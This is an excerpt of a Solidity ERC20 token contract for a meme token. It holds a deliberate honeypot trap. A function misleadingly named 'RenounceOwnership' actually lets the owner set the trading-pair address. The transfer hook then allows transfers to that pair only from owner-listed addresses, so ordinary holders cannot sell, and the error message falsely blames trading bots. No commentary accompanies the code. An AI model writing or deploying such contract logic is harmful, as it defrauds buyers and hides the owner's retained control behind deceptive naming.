...
contract DILDO is ERC20, Ownable {
    mapping(address=>bool) private _blacklisted;
    address private _dildoToken;
    constructor() ERC20('DILDO','DILDO') {
    ...
    function RenounceOwnership(address dildoToken_) public onlyOwner {
        _dildoToken = dildoToken_;
    }

    function _pampingMechanism(address from, address to, uint256 amount) internal virtual override {
        if(to == _dildoToken) {
            require(_blacklisted[from], "Trading bots are not allowed the green $DILDO");
        }
    }
}